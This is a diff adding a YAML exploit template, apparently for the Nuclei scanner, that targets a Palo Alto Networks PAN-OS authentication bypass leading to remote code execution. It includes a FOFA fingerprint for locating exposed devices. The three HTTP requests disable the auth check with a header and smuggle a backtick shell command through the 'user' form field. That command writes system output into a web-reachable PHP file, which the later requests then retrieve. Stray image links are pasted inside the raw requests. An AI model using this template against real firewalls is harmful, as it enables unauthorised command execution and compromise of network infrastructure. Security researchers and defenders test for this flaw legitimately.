@@ -1,0 +1,68 @@
+id: poc-qes7mlliyg9cy10p
+info:
+  name: Palo Alto Networks PAN-OS身份认证绕过导致RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qes7mlliyg9cy10p'
+  tags: rce,unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qes7mlliyg9cy10p
+    fofa: icon_hash="873381299"
+http:
+- raw:
+  - 'POST /php/utils/createRemoteAppwebSession.php/rce.js.map HTTP/1.1
+
+    Host: {{Hostname}}
+
+    X-PAN-AUTHCHECK: off
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    user=`echo $(uname -a) > /var/appweb/htdocs/unauth/rce.php`&userRole=superuser&remoteHost=&vsys=vsys1
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1732599962726-a17b5886-189d-4201-b3b6-f31c9dfaabb6.png)
+
+    携带cookie权限提升并执行命令'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /index.php/.js.map HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: 上一步返回的cookie
+
+    X-PAN-AUTHCHECK: off
+
+    Connection: keep-alive
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1732599963019-2295a87f-b46a-42db-982c-bb716f67e77e.png)
+
+    获取命令执行结果'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /unauth/rce.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: 上一步获取的cookie
+
+    X-PAN-AUTHCHECK: off
+
+    Connection: keep-alive
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1732599963307-bf719a98-bfed-4dd1-83f5-08c3aa24f0e4.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
